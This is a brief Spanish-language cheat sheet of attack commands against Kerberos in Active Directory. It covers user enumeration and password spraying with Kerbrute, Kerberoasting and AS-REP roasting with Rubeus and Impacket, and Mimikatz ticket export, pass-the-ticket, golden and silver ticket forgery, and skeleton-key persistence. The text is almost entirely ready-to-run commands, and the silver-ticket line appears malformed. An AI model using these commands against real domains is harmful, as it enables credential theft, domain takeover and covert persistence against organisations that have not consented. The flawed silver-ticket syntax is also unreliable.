# Kerberos

## Enumeración de usuarios 
### Kebrute
```
kerbrute userenum --dc DC.tld -d DOMAIN.tld Userlist.txt
```

## Ticket Harvesting
### Rubeus
```
Rubeus.exe harvest /interval:30
```

## Password Spray
### Rubeus
Esto devolvera un ticket para poder ejecutar un PTT
```
Rubeus.exe brute /password:Password1 /noticket
```
### Kebrute
```
kerbrute passwordspray --dc DC.tld -d DOMAIN.tld Userlist.txt PASS
``` 

## Kerberoasting
### Rubeus
```
Rubeus.exe kerberoast
```
### Impacket
```
GetUserSPNs.py DC.tld/USER:PASS -dc-ip 10.10.43.249 -request
```

## ASREPRoasting
### Rubeus
```
Rubeus.exe asreproast 
```
### Impacket
```
GetNPUsers.py domain.tld/user:password
```

## Mimikatz
### Find tickets
```
sekurlsa::tickets /export
```
### PTT
```
kerberos::ptt <ticket>
```
### Golden Ticket
```
lsadump::lsa /inject /name:krbtgt
Kerberos::golden /user:Administrator /domain:DC.tld /sid:SID /krbtgt:NTLMHASH /id:UID
```
### Silver Ticket
```
lsadump::lsa /inject /name:serviceacc
Kerberos::golden /user:Administrator /domain:DC.tld /sid:SID /serviceacc:NTLMHASH /id:UID
```
### Skeleton Key
```
misc::skeleton
```
